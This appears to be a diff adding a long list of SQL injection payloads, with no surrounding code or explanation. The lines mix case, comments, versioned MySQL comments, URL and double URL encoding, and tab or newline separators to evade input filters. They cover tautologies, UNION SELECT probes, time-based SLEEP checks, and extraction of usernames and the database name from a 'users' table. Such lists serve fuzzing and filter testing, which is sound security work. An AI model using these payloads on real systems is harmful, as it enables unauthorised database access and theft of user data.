+' OR (seLEc/*rAnDom*/T COUNT(*) fROM users)>0 --
+%27%2509OR%2509EXistS%28sElEcT%2509%2A%2509froM%2509users%29%2509--
+'%09OR%09exiS/*random*/tS(select%09*%09FrOM%09users)%09--
+%27%0AOr%0A%28sElECT%0AGROUP_CONCAT%28username%29%0AFrOM%0Ausers%29%0A--
+'	oR	'a'='a'	--
+%27%2509OR%2509%28SelEC/%2A%2150000%2A/T%2509database%28%29%29%2509--
+'%0aOR%0aEXiSTs(S--eLECT%0a*%0aFrom%0ausers)%0a--
+'%0aOR%0aIF(1=1,sLEEp(5),0)%0a--
+%27%0AOR%0AIF%281%3D1%2CSLEep%285%29%2C0%29%0A--
+'
+oR
+IF(1=1,sLe#Ep(5),0)
+--
+'%09Or%091=1%09--
+%27%2509or%2509%28s--elEct%2509database%28%29%29%2509--
+'%0auni/**/On%0as/*ranDom*/eleCt%0a1,2,3%0a--
+'%0aor%0a(seleCT%0adatabase())%0a--
+' Or (sElecT COUNT(*) f/**/roM users)>0 --
+%27%09Or%091%3D1%09--
+%27%2509oR%2509%28se%23LecT%2509GROUP_CONCAT%28username%29%2509fro%23m%2509users%29%2509--
+%27%0AUni/%2A%2A/ON%0ASelEC/%2ArA%23nDom%2A/t%0A1%2C2%2C3%0A--
+'	or	1=1	--
+'
+or
+ExIStS(sel#eCt
+*
+F/*!50000*/rOm
+users)
+--
+%27%0AOR%0AIF%281%3D1%2CSLeEp%285%29%2C0%29%0A--
+'%09un/**/IoN%09SElECt%091,2,3%09--
+'%0aOr%0a1=1%0a--
+%27%250aUnio/%2A%2A/N%250asELEct%250a1%2C2%2C3%250a--
+'%09or%09(seLEcT%09database())%09--
+%27%0AoR%0A%28sELe/%2A%2150000%2A/ct%0AGROUP_CONCAT%28username%29%0Af/%2A%2150000%2A/rOm%0Ausers%29%0A--
+'%09OR%09(seLECT%09GROUP_CONCAT(username)%09from%09users)%09--
+'	or	(s/**/eLeCT	GROUP_CONCAT(username)	FroM	users)	--
+%27%20or%201%3D1%20--
+'%0aoR%0a(sEle/*!50000*/ct%0adatabase())%0a--
+%27%0AUNIon%0As/%2Ara/%2Arandom%2A/Ndom%2A/ElecT%0A1%2C2%2C3%0A--
+%27%20oR%20%28S--ElecT%20GROUP_CONCAT%28username%29%20frOm%20users%29%20--
+' oR 1=1 --
+'	oR	(seLECT	database())	--
+'%0aOR%0a(seLEC/*!50000*/T%0aCOUNT(*)%0afROm%0ausers)>0%0a--
+'%09Or%09eXIsts(selECt%09*%09fr--Om%09users)%09--
+%27%20OR%20IF%281%3D1%2Csl--eEp%285%29%2C0%29%20--
+%27%2509OR%2509IF%281%3D1%2Cs--lEep%285%29%2C0%29%2509--
+%27%2509OR%2509EXis/%2Arandom%2A/ts%28Sel%23ect%2509%2A%2509frOm%2509users%29%2509--
+'%09oR%091=1%09--
+%27%09or%09%28SELeCT%09database%28%29%29%09--
+'%09U/*ranDom*/NION%09sel/*ranDom*/ecT%091,2,3%09--
+'%0auNIon%0aSeL/*!50000*/Ect%0a1,2,3%0a--
+'%0aoR%0a(seLEcT%0aGROUP_CONCAT(username)%0aFROM%0ausers)%0a--
+%27%20UN--ioN%20sELECt%201%2C2%2C3%20--
+%27%20Or%201%3D1%20--
+%27%09Or%09%28SElEcT%09COUNT%28%2A%29%09FRo%23M%09users%29%3E0%09--
+' Or (sElec/**/T database()) --
+%27%09UniOn%09seLEct%091%2C2%2C3%09--
+%27%2509Or%2509%28Sel/%2A%2A/ect%2509COUNT%28%2A%29%2509FR/%2A%2A/oM%2509users%29%3E0%2509--
+%27%2509Or%2509eXisTs%28SeL/%2ArANdom%2A/Ect%2509%2A%2509FRO--M%2509users%29%2509--
+'%0aOr%0aIF(1=1,slE/*!50000*/Ep(5),0)%0a--
+'%09or%09IF(1=1,SleeP(5),0)%09--
+'%09OR%091=1%09--
+' OR (SeLECT COUNT(*) fROm users)>0 --
+%27%0AoR%0A%28S/%2ArAN/%2Arandom%2A/Dom%2A/ELeCT%0Adatabase%28%29%29%0A--
+'%09OR%09exIsTS(SeLeCt%09*%09F#rOm%09users)%09--
+'%0aOR%0a1=1%0a--
+'%0aor%0a(s/*!50000*/eLeCT%0aGROUP_CONCAT(username)%0afr#oM%0ausers)%0a--
+%27%250aoR%250a%28Se--LECt%250aGROUP_CONCAT%28username%29%250aFRoM%250ausers%29%250a--
+'%09OR%09(selEcT%09database())%09--
+'%09Un--ION%09s--eLECT%091,2,3%09--
+%27%09oR%09exIsTs%28sELEct%09%2A%09FrOM%09users%29%09--
+'
+OR
+1=1
+--
+%27%20Or%20%28seLEcT%20database%28%29%29%20--
+'%09Or%09EX/*!50000*/Ists(selEC/*!50000*/T%09*%09FRom%09users)%09--
+%27%20or%20%27a%27%3D%27a%27%20--
+' OR (SEl/*raN/**/Dom*/eCT GROUP_CONCAT(username) from users) --
+'	uniON	Sel#ecT	1,2,3	--
+%27%20or%20IF%281%3D1%2CSlEep%285%29%2C0%29%20--
+'	or	'a'='a'	--
+'%0aor%0aEX--Ists(sElECT%0a*%0aFROm%0ausers)%0a--
+%27%2509Or%2509IF%281%3D1%2CSLEEP%285%29%2C0%29%2509--
+%27%20oR%20%28sElECt%20COUNT%28%2A%29%20fRoM%20users%29%3E0%20--
+%27%20OR%20IF%281%3D1%2CSLeEP%285%29%2C0%29%20--
+%27%09oR%09%28SELEc/%2Ara--nDom%2A/t%09database%28%29%29%09--
+'
+oR
+1=1
+--
+' Or (SeLeC/**/t COUNT(*) f#RoM users)>0 --
+'
+Or
+(SEleC--T
+GROUP_CONCAT(username)
+Fr/**/om
+users)
+--
+' OR (SEle/**/CT GROUP_CONCAT(username) FroM users) --
+'
+or
+(seLECt
+GROUP_CONCAT(username)
+frOM
+users)
+--
+'	OR	ExIs/**/Ts(SelECT	*	From	users)	--
+'%0aOR%0a'a'='a'%0a--
+' Or (sELEct COUNT(*) FRo/*random*/M users)>0 --
+%27%250aor%250aIF%281%3D1%2CslEEp%285%29%2C0%29%250a--
+%27%250aOr%250aExiSts%28seLEct%250a%2A%250af%23roM%250ausers%29%250a--
+%27%20oR%20%28sELECt%20database%28%29%29%20--
+'%09Or%091=1%09--
+'%0aoR%0a(seLect%0aCOUNT(*)%0aFrOM%0ausers)>0%0a--
+%27%09or%09%28seLEct%09GROUP_CONCAT%28username%29%09froM%09users%29%09--
+%27%2509uniOn%2509sel/%2ArAN--Dom%2A/eCT%25091%2C2%2C3%2509--
+'%0aOR%0a(SeLect%0aCOUNT(*)%0aFR/**/oM%0ausers)>0%0a--
+'	OR	(Sel/*rAnDom*/ect	GROUP_CONCAT(username)	FR/*random*/oM	users)	--
+'%0aoR%0a(Select%0aCOUNT(*)%0afr/*random*/Om%0ausers)>0%0a--
+'%09or%09exIStS(seLEct%09*%09FROm%09users)%09--
+%27%0AOR%0A%28sE/%2A%2A/lECt%0AGROUP_CONCAT%28username%29%0Afr/%2Arandom%2A/OM%0Ausers%29%0A--
+'%0aoR%0aEXiSTS(sELECT%0a*%0aF/*!50000*/rOm%0ausers)%0a--
+'	OR	(sELecT	database())	--
+%27%09or%09eXIST%23S%28SE%23LecT%09%2A%09frO%23m%09users%29%09--
+%27%09OR%09%27a%27%3D%27a%27%09--
+'
+or
+(seLeCT
+COUNT(*)
+fr#Om
+users)>0
+--
+%27%09OR%09exIsTs%28sELect%09%2A%09fRoM%09users%29%09--
+%27%2509Or%25091%3D1%2509--
+' Or (se/*rAN/**/dom*/LECT GROUP_CONCAT(username) f/*!50000*/ROM users) --
+' or IF(1=1,sL/**/eEP(5),0) --
+%27%09oR%09%28sElect%09COUNT%28%2A%29%09fROm%09users%29%3E0%09--
+'	oR	'a'='a'	--
+'
+oR
+'a'='a'
+--
+%27%2509Or%2509e/%2Arandom%2A/xIstS%28SElEct%2509%2A%2509From%2509users%29%2509--
+%27%09oR%09%28SelecT%09GROUP_CONCAT%28username%29%09From%09users%29%09--
+'	or	(SELECT	GROUP_CONCAT(username)	F/**/ROm	users)	--
+'%09oR%09'a'='a'%09--
+'
+or
+eXiSts(SELect
+*
+fRom
+users)
+--
+%27%20OR%20%27a%27%3D%27a%27%20--
+%27%250aOr%250a%27a%27%3D%27a%27%250a--
+%27%2509oR%2509EXi/%2Arandom%2A/sts%28sELEct%2509%2A%2509fR%23OM%2509users%29%2509--
